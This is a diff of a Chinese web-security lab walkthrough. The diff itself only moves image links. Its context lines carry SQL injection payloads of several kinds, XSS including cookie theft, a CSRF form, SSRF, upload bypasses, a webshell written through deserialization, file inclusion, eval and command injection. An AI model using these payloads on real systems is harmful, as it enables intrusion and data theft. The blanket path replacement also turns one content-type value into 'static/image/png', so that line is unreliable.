@@ -27,7 +27,7 @@ $config['db']['User'] = "" // 这里修改数据库用户名
 $config['db']['Pwd'] = "" // 这里修改数据库密码
 ```
 
-![image-20250224012546345](image/image-20250224012546345.png)
+![image-20250224012546345](static/image/image-20250224012546345.png)
 
 ## SQL注入
 
@@ -78,13 +78,13 @@ $config['db']['Pwd'] = "" // 这里修改数据库密码
 and 1=1 # 返回正常
 ```
 
-![image-20250221224732826](image/image-20250221224732826.png)
+![image-20250221224732826](static/image/image-20250221224732826.png)
 
 ```mysql
 and 1=2 # 返回异常
 ```
 
-![image-20250221224849806](image/image-20250221224849806.png)
+![image-20250221224849806](static/image/image-20250221224849806.png)
 
 ```
 其外的像输入单引号报错等，也是检测sql注入漏洞的测试方法。
@@ -102,7 +102,7 @@ union select 1,2,3 ...
 访问 order by 5 的时候，页面异常了没有显示数据。这说明表的字段总共有4个。用 union select 1,2,3,4 这样来测试也是可以的。
 ```
 
-![image-20250221225311219](image/image-20250221225311219.png)
+![image-20250221225311219](static/image/image-20250221225311219.png)
 
 #### 查询数据库用户
 
@@ -111,7 +111,7 @@ union select null,group_concat(user()),NULL
 union select 1,group_concat(user()),3
 ````
 
-![image-20250221225827274](image/image-20250221225827274-0229631.png)
+![image-20250221225827274](static/image/image-20250221225827274-0229631.png)
 
 #### 查询MySQL版本
 
@@ -120,7 +120,7 @@ union select null,group_concat(version()),NULL
 union select 1,group_concat(version()),3
 ```
 
-![image-20250221225909790](image/image-20250221225909790.png)
+![image-20250221225909790](static/image/image-20250221225909790.png)
 
 #### 查询数据库名
 
@@ -138,13 +138,13 @@ UNION ALL SELECT NULL,CONCAT(0x7e,JSON_ARRAYAGG(CONCAT_WS('',schema_name)),0x7e)
 查询当前数据库名
 ```
 
-![image-20250221225959154](image/image-20250221225959154.png)
+![image-20250221225959154](static/image/image-20250221225959154.png)
 
 ```
 查询所有数据库名
 ```
 
-![image-20250221230137292](image/image-20250221230137292.png)
+![image-20250221230137292](static/image/image-20250221230137292.png)
 
 #### 查询表名
 
@@ -154,15 +154,15 @@ union select null,group_concat(table_name),null from information_schema.tables w
 UNION ALL SELECT NULL,CONCAT(0x7e,JSON_ARRAYAGG(CONCAT_WS('',table_name)),0x7e),NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=数据库名
 ```
 
-![image-20250221230402583.png](image/image-20250221230402583.png)
+![image-20250221230402583.png](static/image/image-20250221230402583.png)
 
 ```
 如果要查询指定数据库名可以将databse() 替换成 16进制转换后的数据库名 0x67627567，或者 'gbug' 
 ```
 
-![image-20250221230722588](image/image-20250221230722588.png)
+![image-20250221230722588](static/image/image-20250221230722588.png)
 
-![image-20250221230749578](image/image-20250221230749578.png)
+![image-20250221230749578](static/image/image-20250221230749578.png)
 
 #### 查询字段名
 
@@ -172,7 +172,7 @@ union select null,group_concat(column_name),null from information_schema.columns
 UNION ALL SELECT NULL,CONCAT(0x7e,JSON_ARRAYAGG(CONCAT_WS('',column_name)),0x7e),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema=数据库名 and table_name=表名
 ```
 
-![image-20250221231115885](image/image-20250221231115885.png)
+![image-20250221231115885](static/image/image-20250221231115885.png)
 
 #### 查询数据内容
 
@@ -180,7 +180,7 @@ UNION ALL SELECT NULL,CONCAT(0x7e,JSON_ARRAYAGG(CONCAT_WS('',column_name)),0x7e)
 union select null,group_concat(id,0x7e,username,0x7e,password),null from 数据库名.表名
 ```
 
-![image-20250221231417264](image/image-20250221231417264.png)
+![image-20250221231417264](static/image/image-20250221231417264.png)
 
 ### 布尔盲注
 
@@ -194,13 +194,13 @@ union select null,group_concat(id,0x7e,username,0x7e,password),null from 数据�
 and 1=1 # 返回正常页面
 ```
 
-![image-20250222003224698](image/image-20250222003224698-0229713.png)
+![image-20250222003224698](static/image/image-20250222003224698-0229713.png)
 
 ```mysql
 and 1=2 # 页面返回404
 ```
 
-![image-20250222003312138](image/image-20250222003312138.png)
+![image-20250222003312138](static/image/image-20250222003312138.png)
 
 #### 判断数据库数量
 
@@ -212,7 +212,7 @@ AND ((SELECT COUNT(schema_name) FROM information_schema.schemata)=1)
 注入语句等于 9 时它页面返回正常内容，因此它的数据库总数为 9。
 ```
 
-![image-20250222003626457](image/image-20250222003626457.png)
+![image-20250222003626457](static/image/image-20250222003626457.png)
 
 #### 判断数据库名长度
 
@@ -227,9 +227,9 @@ AND ((SELECT LENGTH(schema_name) FROM information_schema.schemata limit 第x个�
 第一个数据库名长度为 7
 ```
 
-![image-20250222004323069](image/image-20250222004323069.png)
+![image-20250222004323069](static/image/image-20250222004323069.png)
 
-![image-20250222004637294](image/image-20250222004637294.png)
+![image-20250222004637294](static/image/image-20250222004637294.png)
 
 #### 判断数据库名
 
@@ -241,7 +241,7 @@ AND ((SELECT ASCII(SUBSTR(schema_name,第x位,1)) FROM information_schema.schema
 ascii码 98 对应的字符是 b，第一个数据库的完整名是 bugtest，第一位是 b
 ```
 
-![image-20250222004853749](image/image-20250222004853749-0229746.png)
+![image-20250222004853749](static/image/image-20250222004853749-0229746.png)
 
 #### 判断表的数量
 
@@ -255,9 +255,9 @@ AND ((SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema
 gbug 数据库的表总数为 6
 ```
 
-![image-20250222005743713](image/image-20250222005743713.png)
+![image-20250222005743713](static/image/image-20250222005743713.png)
 
-![image-20250222005857749](image/image-20250222005857749.png)
+![image-20250222005857749](static/image/image-20250222005857749.png)
 
 #### 判断表名长度
 
@@ -269,9 +269,9 @@ AND ((SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schem
 gbug 数据库的第一个表的表名长度为 7
 ```
 
-![image-20250222010313673](image/image-20250222010313673.png)
+![image-20250222010313673](static/image/image-20250222010313673.png)
 
-![image-20250222005857749](image/image-20250222005857749.png)
+![image-20250222005857749](static/image/image-20250222005857749.png)
 
 #### 判断表名
 
@@ -283,7 +283,7 @@ AND ((SELECT ASCII(SUBSTR(table_name,第x位,1)) FROM information_schema.tables 
 ascii码 97 对应的字符是 a，数据库 gbug的第一个表完整的表名是 address，第一位是 a
 ```
 
-![image-20250222012359139](image/image-20250222012359139.png)
+![image-20250222012359139](static/image/image-20250222012359139.png)
 
 #### 判断字段的数量
 
@@ -295,9 +295,9 @@ AND ((SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name
 gbug 数据库的users表字段总数为 3
 ```
 
-![image-20250222020004089](image/image-20250222020004089.png)
+![image-20250222020004089](static/image/image-20250222020004089.png)
 
-![image-20250222020257789](image/image-20250222020257789.png)
+![image-20250222020257789](static/image/image-20250222020257789.png)
 
 #### 判断字段名长度
 
@@ -309,7 +309,7 @@ AND ((SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_nam
 gbug 数据库的users表的第一个字段长度为 2
 ```
 
-![image-20250222021028544](image/image-20250222021028544.png)
+![image-20250222021028544](static/image/image-20250222021028544.png)
 
 #### 判断字段名
 
@@ -321,7 +321,7 @@ AND ((SELECT ASCII(SUBSTR(column_name,第x位,1)) FROM information_schema.column
 ascii码 105 对应的字符是 i，数据库 gbug的users表中的第一个字段完整的字段名为 id，第一位是 i
 ```
 
-![image-20250222021259610](image/image-20250222021259610.png)
+![image-20250222021259610](static/image/image-20250222021259610.png)
 
 #### 判断数据数量
 
@@ -333,9 +333,9 @@ AND ((SELECT COUNT(字段名) FROM 数据库名.表名)=1)
 gbug 数据库的users表数据数量为 2
 ```
 
-![image-20250222021700545](image/image-20250222021700545.png)
+![image-20250222021700545](static/image/image-20250222021700545.png)
 
-![image-20250222021848684](image/image-20250222021848684.png)
+![image-20250222021848684](static/image/image-20250222021848684.png)
 
 #### 判断数据内容长度
 
@@ -347,7 +347,7 @@ AND ((SELECT LENGTH(字段名) FROM 数据库名.表名 limit 第x条数据,1)=4
 gbug 数据库的users表中username字段的数据内容长度为 4
 ```
 
-![image-20250222022035693](image/image-20250222022035693.png)
+![image-20250222022035693](static/image/image-20250222022035693.png)
 
 #### 判断数据内容
 
@@ -359,7 +359,7 @@ AND ((SELECT ASCII(SUBSTR(字段名,第x位,1)) FROM 数据库名.表名 limit �
 ascii码 103 对应的字符是 g，数据库 gbug的users表中第一条数据的username字段的完整数据内容是 gbug，第一位是 g
 ```
 
-![image-20250222022319425](image/image-20250222022319425.png)
+![image-20250222022319425](static/image/image-20250222022319425.png)
 
 ### 时间盲注
 
@@ -375,9 +375,9 @@ AND IF((SELECT COUNT(schema_name) FROM information_schema.schemata)=1,sleep(2),0
 访问站点时，延迟了5秒。说明我们构造的注入语句执行了。
 ```
 
-![image-20250222151235928](image/image-20250222151235928.png)
+![image-20250222151235928](static/image/image-20250222151235928.png)
 
-![image-20250222151544304](image/image-20250222151544304.png)
+![image-20250222151544304](static/image/image-20250222151544304.png)
 
 #### 判断数据库名长度
 
@@ -455,7 +455,7 @@ AND IF((SELECT ASCII(SUBSTR(字段名,第x位,1)) FROM 数据库名.表名 limit
 updatexml(null,concat(0x7e,(select user()),0x7e),null)
 ```
 
-![image-20250222152355338](image/image-20250222152355338.png)
+![image-20250222152355338](static/image/image-20250222152355338.png)
 
 #### 获取MySQL版本
 
@@ -463,7 +463,7 @@ updatexml(null,concat(0x7e,(select user()),0x7e),null)
 updatexml(null,concat(0x7e,(select version()),0x7e),null)
 ```
 
-![image-20250222152451911](image/image-20250222152451911.png)
+![image-20250222152451911](static/image/image-20250222152451911.png)
 
 #### 获取当前数据库名
 
@@ -471,7 +471,7 @@ updatexml(null,concat(0x7e,(select version()),0x7e),null)
 updatexml(null,concat(0x7e,(select database()),0x7e),null)
 ```
 
-![image-20250222152611286](image/image-20250222152611286.png)
+![image-20250222152611286](static/image/image-20250222152611286.png)
 
 #### 获取数据库数量
 
@@ -479,7 +479,7 @@ updatexml(null,concat(0x7e,(select database()),0x7e),null)
 updatexml(1,concat(0x7e,(SELECT(COUNT(schema_name))FROM(information_schema.schemata)),0x7e),1)
 ```
 
-![image-20250222154011697](image/image-20250222154011697.png)
+![image-20250222154011697](static/image/image-20250222154011697.png)
 
 #### 获取数据库名长度
 
@@ -488,14 +488,14 @@ updatexml(1,concat(0x7e,(SELECT(COUNT(schema_name))FROM(information_schema.schem
 updatexml(1,concat(0x7e,(SELECT(LENGTH(schema_name))FROM(information_schema.schemata) limit 第x个数据库,1),0x7e),1)
 ```
 
-![image-20250222155248364](image/image-20250222155248364.png)
+![image-20250222155248364](static/image/image-20250222155248364.png)
 
 ```mysql
 # 获取输出所有数据库名的字符串长度
 updatexml(1,concat(0x7e,(SELECT(LENGTH(group_concat(schema_name)))FROM(information_schema.schemata)),0x7e),1)
 ```
 
-![image-20250222155203513](image/image-20250222155203513.png)
+![image-20250222155203513](static/image/image-20250222155203513.png)
 
 #### 获取所有数据库名
 
@@ -504,21 +504,21 @@ updatexml(1,concat(0x7e,(SELECT(LENGTH(group_concat(schema_name)))FROM(informati
 updatexml(1,concat(0x7e,(SELECT(SUBSTRING(group_concat(schema_name),字符串头,字符串尾))FROM(information_schema.schemata)),0x7e),1)
 ```
 
-![image-20250222154138099](image/image-20250222154138099.png)
+![image-20250222154138099](static/image/image-20250222154138099.png)
 
 ```mysql
 # 通过 limit 来指定第几个，但是数据库名过长的话会导致显示不完整，mysql报错输出内容有长度限制
 updatexml(1,concat(0x7e,(SELECT(CONCAT(schema_name))FROM(information_schema.schemata) limit 第x个数据库,1),0x7e),1)
 ```
 
-![image-20250222154220093](image/image-20250222154220093.png)
+![image-20250222154220093](static/image/image-20250222154220093.png)
 
 ```mysql
 # 获取数据库名ASCII码
 updatexml(1,concat(0x7e,(SELECT(ASCII(SUBSTR(schema_name,第x位,1)))FROM(information_schema.schemata) limit 第x个数据库,1),0x7e),1)
 ```
 
-![image-20250222154433326](image/image-20250222154433326.png)
+![image-20250222154433326](static/image/image-20250222154433326.png)
 
 #### 获取表的数量
 
@@ -527,7 +527,7 @@ updatexml(1,concat(0x7e,(SELECT(ASCII(SUBSTR(schema_name,第x位,1)))FROM(inform
 updatexml(1,concat(0x7e,(SELECT(COUNT(table_name))FROM(information_schema.tables)WHERE(table_schema='数据库名')),0x7e),1)
 ```
 
-![image-20250222154825960](image/image-20250222154825960.png)
+![image-20250222154825960](static/image/image-20250222154825960.png)
 
 #### 获取表名长度
 
@@ -536,14 +536,14 @@ updatexml(1,concat(0x7e,(SELECT(COUNT(table_name))FROM(information_schema.tables
 updatexml(1,concat(0x7e,(SELECT(LENGTH(table_name))FROM(information_schema.tables)WHERE(table_schema='数据库名') limit 第x个表,1),0x7e),1)
 ```
 
-![image-20250222160219823](image/image-20250222160219823.png)
+![image-20250222160219823](static/image/image-20250222160219823.png)
 
 ```mysql
 # 获取输出所有表名的字符串长度
 updatexml(1,concat(0x7e,(SELECT(LENGTH(group_concat(table_name)))FROM(information_schema.tables)WHERE(table_schema='数据库名')),0x7e),1)
 ```
 
-![image-20250222160935609](image/image-20250222160935609.png)
+![image-20250222160935609](static/image/image-20250222160935609.png)
 
 #### 获取所有表名
 
@@ -552,21 +552,21 @@ updatexml(1,concat(0x7e,(SELECT(LENGTH(group_concat(table_name)))FROM(informatio
 updatexml(1,concat(0x7e,(SELECT(SUBSTRING(group_concat(table_name),字符串头,字符串尾))FROM(information_schema.tables)WHERE(table_schema='数据库名')),0x7e),1)
 ```
 
-![image-20250222161616691](image/image-20250222161616691.png)
+![image-20250222161616691](static/image/image-20250222161616691.png)
 
 ```mysql
 # 通过 limit 来指定第几个，但是表名过长的话会导致显示不完整，mysql报错输出内容有长度限制
 updatexml(1,concat(0x7e,(SELECT(CONCAT(table_name))FROM(information_schema.tables)WHERE(table_schema='数据库名') limit 第x个表,1),0x7e),1)
 ```
 
-![image-20250222161805014](image/image-20250222161805014.png)
+![image-20250222161805014](static/image/image-20250222161805014.png)
 
 ```mysql
 # 获取表名ASCII码
 updatexml(1,concat(0x7e,(SELECT(ASCII(SUBSTR(table_name,第x位,1)))FROM(information_schema.tables)WHERE(table_schema='数据库名') limit 第x个数表,1),0x7e),1)
 ```
 
-![image-20250222161950802](image/image-20250222161950802.png)
+![image-20250222161950802](static/image/image-20250222161950802.png)
 
 #### 获取字段数量
 
@@ -574,7 +574,7 @@ updatexml(1,concat(0x7e,(SELECT(ASCII(SUBSTR(table_name,第x位,1)))FROM(informa
 updatexml(1,concat(0x7e,(SELECT(COUNT(column_name))FROM(information_schema.columns)WHERE(table_schema='数据库名')AND(table_name='表名')),0x7e),1)
 ```
 
-![image-20250222162218824](image/image-20250222162218824.png)
+![image-20250222162218824](static/image/image-20250222162218824.png)
 
 #### 获取字段名长度
 
@@ -583,14 +583,14 @@ updatexml(1,concat(0x7e,(SELECT(COUNT(column_name))FROM(information_schema.colum
 updatexml(1,concat(0x7e,(SELECT(LENGTH(column_name))FROM(information_schema.columns)WHERE(table_schema='数据库名')AND(table_name='表名') limit 第x个字段,1),0x7e),1)
 ```
 
-![image-20250222162422892](image/image-20250222162422892.png)
+![image-20250222162422892](static/image/image-20250222162422892.png)
 
 ```mysql
 # 获取输出所有字段名的字符串长度
 updatexml(1,concat(0x7e,(SELECT(LENGTH(group_concat(column_name)))FROM(information_schema.columns)WHERE(table_schema='数据库名')AND(table_name='表名')),0x7e),1)
 ```
 
-![image-20250222162905481](image/image-20250222162905481.png)
+![image-20250222162905481](static/image/image-20250222162905481.png)
 
 #### 获取所有字段名
 
@@ -599,21 +599,21 @@ updatexml(1,concat(0x7e,(SELECT(LENGTH(group_concat(column_name)))FROM(informati
 updatexml(1,concat(0x7e,(SELECT(SUBSTRING(group_concat(column_name),字符串头,字符串尾))FROM(information_schema.columns)WHERE(table_schema='数据库名')AND(table_name='表名')),0x7e),1)
 ```
 
-![image-20250222163412364](image/image-20250222163412364.png)
+![image-20250222163412364](static/image/image-20250222163412364.png)
 
 ```mysql
 # 通过 limit 来指定第几个，但是字段名过长的话会导致显示不完整，mysql报错输出内容有长度限制
 updatexml(1,concat(0x7e,(SELECT(CONCAT(column_name))FROM(information_schema.columns)WHERE(table_schema='数据库名')AND(table_name='表名') limit 第x个字段,1),0x7e),1)
 ```
 
-![image-20250222163545815](image/image-20250222163545815.png)
+![image-20250222163545815](static/image/image-20250222163545815.png)
 
 ```mysql
 # 获取字段名ASCII码
 updatexml(1,concat(0x7e,(SELECT(ASCII(SUBSTR(column_name,第x位,1)))FROM(information_schema.columns)WHERE(table_schema='数据库名')AND(table_name='表名') limit 第x个字段,1),0x7e),1)
 ```
 
-![image-20250222163738135](image/image-20250222163738135.png)
+![image-20250222163738135](static/image/image-20250222163738135.png)
 
 #### 获取数据数量
 
@@ -621,7 +621,7 @@ updatexml(1,concat(0x7e,(SELECT(ASCII(SUBSTR(column_name,第x位,1)))FROM(inform
 updatexml(1,concat(0x7e,(SELECT(COUNT(字段名))FROM(数据库名.表名)),0x7e),1)
 ```
 
-![image-20250222163915104](image/image-20250222163915104.png)
+![image-20250222163915104](static/image/image-20250222163915104.png)
 
 #### 获取数据内容长度
 
@@ -630,14 +630,14 @@ updatexml(1,concat(0x7e,(SELECT(COUNT(字段名))FROM(数据库名.表名)),0x7e
 updatexml(1,concat(0x7e,(SELECT(LENGTH(字段名))FROM(数据库名.表名) limit 第x条数据,1),0x7e),1)
 ```
 
-![image-20250222164119963](image/image-20250222164119963.png)
+![image-20250222164119963](static/image/image-20250222164119963.png)
 
 ```mysql
 # 获取输出所有数据的字符串长度
 updatexml(1,concat(0x7e,(SELECT(LENGTH(group_concat(字段名)))FROM(数据库名.表名)),0x7e),1)
 ```
 
-![image-20250222164418393](image/image-20250222164418393.png)
+![image-20250222164418393](static/image/image-20250222164418393.png)
 
 #### 获取所有数据内容
 
@@ -646,21 +646,21 @@ updatexml(1,concat(0x7e,(SELECT(LENGTH(group_concat(字段名)))FROM(数据库�
 updatexml(1,concat(0x7e,(SELECT(SUBSTRING(group_concat(id,'-',username,'-',password),字符串头,字符串尾))FROM(数据库名.表名)),0x7e),1)
 ```
 
-![image-20250222164804155](image/image-20250222164804155.png)
+![image-20250222164804155](static/image/image-20250222164804155.png)
 
 ```mysql
 # 通过 limit 来指定第几个，但是数据内容过长的话会导致显示不完整，mysql报错输出内容有长度限制
 updatexml(1,concat(0x7e,(SELECT(CONCAT(字段名))FROM(数据库名.表名) limit 第x条数据,1),0x7e),1)
 ```
 
-![image-20250222164942725](image/image-20250222164942725.png)
+![image-20250222164942725](static/image/image-20250222164942725.png)
 
 ```mysql
 # 获取数据内容ASCII码
 updatexml(1,concat(0x7e,(SELECT(ASCII(SUBSTR(字段名,第x位,1)))FROM(数据库名.表名) limit 第x条数据,1),0x7e),1)
 ```
 
-![image-20250222165102007](image/image-20250222165102007.png)
+![image-20250222165102007](static/image/image-20250222165102007.png)
 
 ### POST注入
 
@@ -671,14 +671,14 @@ updatexml(1,concat(0x7e,(SELECT(ASCII(SUBSTR(字段名,第x位,1)))FROM(数据�
 users=test' and 1=2 union select 1,version(),3-- -&pwd=test123
 ```
 
-![image-20250222191026842](image/image-20250222191026842.png)
+![image-20250222191026842](static/image/image-20250222191026842.png)
 
 ```mysql
 # 以下通过post请求进行盲注的例子
 AND ((SELECT COUNT(schema_name) FROM information_schema.schemata)=9)
 ```
 
-![image-20250222192854127](image/image-20250222192854127.png)
+![image-20250222192854127](static/image/image-20250222192854127.png)
 
 ### COOKIE注入
 
@@ -689,9 +689,9 @@ AND ((SELECT COUNT(schema_name) FROM information_schema.schemata)=9)
 1 and 1=2 # 返回异常
 ```
 
-![image-20250222193241564](image/image-20250222193241564.png)
+![image-20250222193241564](static/image/image-20250222193241564.png)
 
-![image-20250222193525205](image/image-20250222193525205.png)
+![image-20250222193525205](static/image/image-20250222193525205.png)
 
 ## XSS跨站脚本攻击
 
@@ -722,7 +722,7 @@ AND ((SELECT COUNT(schema_name) FROM information_schema.schemata)=9)
 我们将恶意的代码输入的用户输入框里提交，则会执行该恶意代码。
 ```
 
-![image-20250222231654660](image/image-20250222231654660.png)
+![image-20250222231654660](static/image/image-20250222231654660.png)
 
 ### XSS跨站脚本攻击-存储型
 
@@ -732,9 +732,9 @@ AND ((SELECT COUNT(schema_name) FROM information_schema.schemata)=9)
 我们将恶意的代码作为留言发表后，恶意代码将保存到它的数据库中，刷新页面时则会执行该恶意代码。
 ```
 
-![image-20250222231854359](image/image-20250222231854359.png)
+![image-20250222231854359](static/image/image-20250222231854359.png)
 
-![image-20250222232014900](image/image-20250222232014900.png)
+![image-20250222232014900](static/image/image-20250222232014900.png)
 
 ### XSS跨站脚本攻击-Dom型
 
@@ -744,9 +744,9 @@ AND ((SELECT COUNT(schema_name) FROM information_schema.schemata)=9)
 我们通过输入框输入恶意代码再生成链接，它会就将该恶意代码插入到dom元素的href属性中，点击链接时就会触发恶意代码。
 ```
 
-![image-20250222232517691](image/image-20250222232517691.png)
+![image-20250222232517691](static/image/image-20250222232517691.png)
 
-![image-20250222232628039](image/image-20250222232628039.png)
+![image-20250222232628039](static/image/image-20250222232628039.png)
 
 ### XSS跨站脚本攻击-窃取Cookie
 
@@ -768,15 +768,15 @@ document.body.appendChild(img);
 我们将窃取Cookie的XSS攻击代码写到留言中，然后提交发布留言。当有人访问存储该恶意代码的页面时就会将它浏览器的Cookie发送给攻击者。
 ```
 
-![image-20250222234523202](image/image-20250222234523202.png)
+![image-20250222234523202](static/image/image-20250222234523202.png)
 
 ```
 以下是我自己开发的一个XSS平台用于测试。
 ```
 
-![image-20250222234727104](image/image-20250222234727104.png)
+![image-20250222234727104](static/image/image-20250222234727104.png)
 
-![image-20250222234752536](image/image-20250222234752536.png)
+![image-20250222234752536](static/image/image-20250222234752536.png)
 
 ## CSRF & SSRF
 
@@ -788,7 +788,7 @@ document.body.appendChild(img);
 以下是站点添加收货地址的业务页面
 ```
 
-![image-20250223000842034](image/image-20250223000842034.png)
+![image-20250223000842034](static/image/image-20250223000842034.png)
 
 ```
 我们可以通过伪造一个页面，让用户点击，实现添加我们的收货地址的目的。
@@ -805,13 +805,13 @@ document.body.appendChild(img);
 </form>
 ```
 
-![image-20250223001632121](image/image-20250223001632121.png)
+![image-20250223001632121](static/image/image-20250223001632121.png)
 
 ```
 当用户访问我们伪造的页面并点击按钮后，就实现了添加我们的收货地址的目的。
 ```
 
-![image-20250223001758137](image/image-20250223001758137.png)
+![image-20250223001758137](static/image/image-20250223001758137.png)
 
 ### SSRF服务端请求伪造
 
@@ -839,29 +839,29 @@ dict://
 它的正常功能是获取一个远程图片
 ```
 
-![image-20250223003342247](image/image-20250223003342247.png)
+![image-20250223003342247](static/image/image-20250223003342247.png)
 
 ```
 假如我们将url改成127.0.0.1 它会去访问本地并将数据内容保存到图片格式的文件
 ```
 
-![image-20250223003512395](image/image-20250223003512395.png)
+![image-20250223003512395](static/image/image-20250223003512395.png)
 
-![image-20250223003619193](image/image-20250223003619193.png)
+![image-20250223003619193](static/image/image-20250223003619193.png)
 
 ```
 我们通过 curl 可以查看该图片的内容
 ```
 
-![image-20250223003720979](image/image-20250223003720979.png)
+![image-20250223003720979](static/image/image-20250223003720979.png)
 
 ```
 SSRF能做的事不止是查看它内网搭建的网站内容，还可以读取它本地的文件。
 ```
 
-![image-20250223004452418](image/image-20250223004452418.png)
+![image-20250223004452418](static/image/image-20250223004452418.png)
 
-![image-20250223004513080](image/image-20250223004513080.png)
+![image-20250223004513080](static/image/image-20250223004513080.png)
 
 ## 文件上传漏洞
 
@@ -873,9 +873,9 @@ SSRF能做的事不止是查看它内网搭建的网站内容，还可以读取�
 可以上传任意后缀的文件
 ```
 
-![image-20250223005016165](image/image-20250223005016165.png)
+![image-20250223005016165](static/image/image-20250223005016165.png)
 
-![image-20250223005036592](image/image-20250223005036592.png)
+![image-20250223005036592](static/image/image-20250223005036592.png)
 
 ### Content-Type 检测绕过
 
@@ -883,14 +883,14 @@ SSRF能做的事不止是查看它内网搭建的网站内容，还可以读取�
 提交上传请求时，服务端会通过检测 content-type 是来判断否为图片
 ```
 
-![image-20250223005536675](image/image-20250223005536675.png)
+![image-20250223005536675](static/image/image-20250223005536675.png)
 
 ```
 我们可以通过抓包来修改 content-type 实现绕过检测
-将 content-type 修改为 image/png
+将 content-type 修改为 static/image/png
 ```
 
-![image-20250223005827410](image/image-20250223005827410.png)
+![image-20250223005827410](static/image/image-20250223005827410.png)
 
 ### 前端 JavaScript 检测绕过
 
@@ -898,11 +898,11 @@ SSRF能做的事不止是查看它内网搭建的网站内容，还可以读取�
 提交上传请求时，前端使用了js代码来检测上传请求的文件是否是图片，当然这种直接用前端来检测的是很骚的。懂开发的都知道前端的代码用户是通过审查元素删掉的。
 ```
 
-![image-20250223010343723](image/image-20250223010343723.png)
+![image-20250223010343723](static/image/image-20250223010343723.png)
 
-![image-20250223010425186](image/image-20250223010425186.png)
+![image-20250223010425186](static/image/image-20250223010425186.png)
 
-![image-20250223010446343](image/image-20250223010446343.png)
+![image-20250223010446343](static/image/image-20250223010446343.png)
 
 ## 反序列化漏洞
 
@@ -919,9 +919,9 @@ SSRF能做的事不止是查看它内网搭建的网站内容，还可以读取�
 一般大一点的项目都有很多 function 因此在开发过程中可能会造成一些安全上的忽略。
 ```
 
-![image-20250223210623356](image/image-20250223210623356.png)
+![image-20250223210623356](static/image/image-20250223210623356.png)
 
-![image-20250223210724349](image/image-20250223210724349.png)
+![image-20250223210724349](static/image/image-20250223210724349.png)
 
 ```
 我们可以看到它的请求参数是 data:{s:4:"func";s:3:"cha";s:4:"user";s:4:"test";}
@@ -930,13 +930,13 @@ SSRF能做的事不止是查看它内网搭建的网站内容，还可以读取�
 假如，我们将cha 改成 print_r 试试能不能调用PHP内置函数
 ```
 
-![image-20250223211454105](image/image-20250223211454105.png)
+![image-20250223211454105](static/image/image-20250223211454105.png)
 
 ```
 通过测试我们可以发现，它是可以调用PHP内置函数的。那么构造个PHP一句话试试？
 ```
 
-![image-20250223211736853](image/image-20250223211736853.png)
+![image-20250223211736853](static/image/image-20250223211736853.png)
 
 ```
 通过测试我们可以发现通过该漏洞可以随意调用PHP内置函数。既然可以随意调用PHP内置函数，那我们就可以做到执行恶意代码、执行命令、读取/写入文件等操作。
@@ -950,15 +950,15 @@ SSRF能做的事不止是查看它内网搭建的网站内容，还可以读取�
 假如我们把，xxxx.log 改成.php 后缀 内容更改为 恶意代码 它就会导出一个带有恶意代码的PHP文件在服务器中。
 ```
 
-![image-20250223212206946](image/image-20250223212206946.png)
+![image-20250223212206946](static/image/image-20250223212206946.png)
 
-![image-20250223213227369](image/image-20250223213227369.png)
+![image-20250223213227369](static/image/image-20250223213227369.png)
 
 ```
 访问路径 static/log/xxxx.php 这就是我们导出的一句话木马。
 ```
 
-![image-20250223213341685](image/image-20250223213341685.png)
+![image-20250223213341685](static/image/image-20250223213341685.png)
 
 ## 其他漏洞
 
@@ -972,9 +972,9 @@ SSRF能做的事不止是查看它内网搭建的网站内容，还可以读取�
 可以加载任意本地的文件，前提是你知道绝对路径的情况下。
 ```
 
-![image-20250223220636013](image/image-20250223220636013.png)
+![image-20250223220636013](static/image/image-20250223220636013.png)
 
-![image-20250223220749142](image/image-20250223220749142.png)
+![image-20250223220749142](static/image/image-20250223220749142.png)
 
 #### 远程文件包含
 
@@ -989,13 +989,13 @@ allow_url_include = Off
 ini_set('allow_url_include','1');
 ```
 
-![image-20250223222212208](image/image-20250223222212208.png)
+![image-20250223222212208](static/image/image-20250223222212208.png)
 
 ```
 也可以通过PHP原始流执行恶意代码 php://input
 ```
 
-![image-20250223222340274](image/image-20250223222340274.png)
+![image-20250223222340274](static/image/image-20250223222340274.png)
 
 ### 代码执行漏洞
 
@@ -1015,20 +1015,20 @@ preg_replace()
 以下页面，它的正常业务功能是查询用户信息。
 ```
 
-![image-20250223223849827](image/image-20250223223849827.png)
+![image-20250223223849827](static/image/image-20250223223849827.png)
 
 ``` 
 但是代码中用到了 eval 函数，代码设计思维是想通过类型来进行查询 data[user] 就是通过用户名查询之类的。
 漏洞的产生是因为没有在使用 eval 函数时做安全处理，导致 data 参数是可控的。
 ```
 
-![image-20250223224024898](image/image-20250223224024898.png)
+![image-20250223224024898](static/image/image-20250223224024898.png)
 
 ```
 我们将参数改成 data[user]=phpinfo() 它就会将我们的参数值当作PHP代码执行。
 ```
 
-![image-20250223224456813](image/image-20250223224456813.png)
+![image-20250223224456813](static/image/image-20250223224456813.png)
 
 ### 命令执行漏洞
 
@@ -1038,7 +1038,7 @@ preg_replace()
 以下页面它的正常业务功能是转换一个 .amr的文件为mp3或avi格式供用户下载。
 ```
 
-![image-20250223231912822](image/image-20250223231912822.png)
+![image-20250223231912822](static/image/image-20250223231912822.png)
 
 ```
 我们在它发送请求过程中可以看到客户端参数是可控的。那么我们可以测试一下修改参数是否能够达到执行命令的效果
@@ -1046,13 +1046,13 @@ preg_replace()
 将 file 参数的值 改为 &dir& 或 ||dir||
 ```
 
-![image-20250223232037068](image/image-20250223232037068.png)
+![image-20250223232037068](static/image/image-20250223232037068.png)
 
 ```
 可以发现 file 的参数值改成 ||dir|| 命令成功执行了。
 ```
 
-![image-20250223232257397](image/image-20250223232257397.png)
+![image-20250223232257397](static/image/image-20250223232257397.png)
 
 ### 会话认证漏洞
 
@@ -1062,19 +1062,19 @@ preg_replace()
 以下页面它登录成功后的页面是 cookie/users 当我们直接访问它会提示非法登录
 ```
 
-![image-20250223234119837](image/image-20250223234119837.png)
+![image-20250223234119837](static/image/image-20250223234119837.png)
 
 ```
 我们通过看代码可以发现它代码中在做会话认证的时候，只判断了 cookie 值是否为空。
 ```
 
-![image-20250223234252072](image/image-20250223234252072.png)
+![image-20250223234252072](static/image/image-20250223234252072.png)
 
 ```
 我们通过浏览器自己创建一个cookie值，即可绕过该会话认证。
 ```
 
-![image-20250223234437939](image/image-20250223234437939.png)
